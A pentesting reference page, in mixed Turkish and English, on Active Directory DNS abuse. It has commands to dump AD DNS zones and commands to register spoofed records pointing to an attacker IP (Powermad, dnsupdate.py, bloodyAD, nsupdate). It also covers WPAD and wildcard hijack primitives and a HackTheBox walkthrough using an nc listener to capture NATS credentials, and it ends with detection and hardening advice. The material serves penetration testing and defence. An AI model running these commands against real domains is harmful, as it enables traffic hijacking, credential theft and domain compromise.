# AD DNS Kayıtları

{{#include ../../banners/hacktricks-training.md}}

Varsayılan olarak Active Directory'de **herhangi bir kullanıcı**, Domain veya Forest DNS zonlarındaki **enumerate all DNS records** işlemini gerçekleştirebilir; bu, bir zone transferine benzer (kullanıcılar bir AD ortamında bir DNS zonunun alt nesnelerini listeleyebilir).

Araç [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) zon içindeki **all DNS records**'ın **enumeration** ve **exporting** işlemlerine, iç ağların recon amaçları için olanak tanır.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) JSON/Greppable (`--json`) çıktısı, çoklu iş parçacıklı DNS çözümlemesi ve LDAPS'e bağlanırken TLS 1.2/1.3 desteği ekler

Daha fazla bilgi için şu kaynağa bakın: [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kayıt Oluşturma / Değiştirme (ADIDNS spoofing)

Because the **Authenticated Users** group has **Create Child** on the zone DACL by default, any domain account (or computer account) can register additional records.  Bu, traffic hijacking, NTLM relay coercion veya hatta tüm etki alanının ele geçirilmesi için kullanılabilir.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py, Impacket ≥0.12.0 ile birlikte gelir)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` AD DNS sunucusunu LLMNR/NBNS spoofing'e benzer kurumsal çapta bir responder haline getirir. NTLM hash'lerini yakalamak veya bunları LDAP/SMB'ye relay etmek için kötüye kullanılabilir. (WINS-lookup'un devre dışı bırakılmasını gerektirir.)
2. **WPAD hijack** – `wpad` ekleyin (veya Global-Query-Block-List'i atlamak için saldırgan bir host'a işaret eden bir **NS** kaydı) ve giden HTTP isteklerini şeffaf şekilde proxyleyerek kimlik bilgilerini toplayın. Microsoft wildcard/DNAME baypaslarını (CVE-2018-8320) yamaladı ama **NS-records still work**.
3. **Stale entry takeover** – daha önce bir workstation'a ait olan IP adresini üstlenin; ilişkilendirilmiş DNS kaydı hâlâ çözülür ve bu, DNS'e dokunmadan resource-based constrained delegation veya Shadow-Credentials saldırılarını mümkün kılar.
4. **DHCP → DNS spoofing** – varsayılan bir Windows DHCP+DNS dağıtımında aynı alt ağda bulunan kimlik doğrulaması yapılmamış bir saldırgan, dinamik DNS güncellemelerini tetikleyen sahte DHCP istekleri göndererek mevcut herhangi bir A record'u (Domain Controllers dahil) üzerine yazabilir (Akamai “DDSpoof”, 2023). Bu, Kerberos/LDAP üzerinde machine-in-the-middle sağlar ve tam domain ele geçirmeye yol açabilir.
5. **Certifried (CVE-2022-26923)** – kontrolünüzdeki bir machine account'un `dNSHostName`'ini değiştirin, eşleşen bir A record kaydı oluşturun, sonra o isim için bir certificate talep ederek DC'yi taklit edin. **Certipy** veya **BloodyAD** gibi araçlar bu akışı tamamen otomatikleştirir.

---

### Internal service hijacking via stale dynamic records (NATS case study)

Dinamik güncellemeler tüm kimlikli kullanıcılara açık kaldığında, **kayıt silinmiş bir servis ismi yeniden talep edilebilir ve saldırgan altyapısına yönlendirilebilir**. Mirage HTB DC, DNS scavenging sonrasında `nats-svc.mirage.htb` host adını açığa çıkardı, bu yüzden düşük ayrıcalıklı herhangi bir kullanıcı şunları yapabilirdi:

1. **Kaydın eksik olduğunu doğrulayın** ve SOA'yı `dig` ile öğrenin:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Kaydı yeniden oluşturun** kontrol ettikleri harici/VPN arayüzüne yönlendirilecek şekilde:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS istemcileri kimlik bilgilerini göndermeden önce bir `INFO { ... }` banner'ı görmeyi bekler; bu yüzden gerçek broker'dan alınan geçerli bir banner'ı kopyalamak secrets elde etmek için yeterlidir:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – in Mirage the stolen NATS account provided JetStream access, which exposed historic authentication events containing reusable AD usernames/passwords.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Tespit ve sertleştirme

* Hassas zonlarda **Authenticated Users**'a *Create all child objects* hakkını reddedin ve dinamik güncellemeleri DHCP tarafından kullanılan özel bir hesaba devredin.
* Dinamik güncellemeler gerekiyorsa, zone'u **Secure-only** olarak ayarlayın ve DHCP'de **Name Protection**'ı etkinleştirin; böylece yalnızca sahibi bilgisayar nesnesi kendi kaydını üzerine yazabilir.
* DNS Server olay ID'lerini 257/252 (dynamic update), 770 (zone transfer) ve `CN=MicrosoftDNS,DC=DomainDnsZones` üzerine yapılan LDAP yazımlarını izleyin.
* Tehlikeli isimleri (`wpad`, `isatap`, `*`) kasıtlı olarak zararsız bir kayıtla veya Global Query Block List aracılığıyla engelleyin.
* DNS sunucularını güncel tutun – örn., RCE hataları CVE-2024-26224 ve CVE-2024-26231 **CVSS 9.8**'e ulaştı ve Domain Controllers'a karşı uzaktan exploit edilebiliyor.

## Referanslar

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More” (2018, hala wildcard/WPAD saldırıları için de-facto referans)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
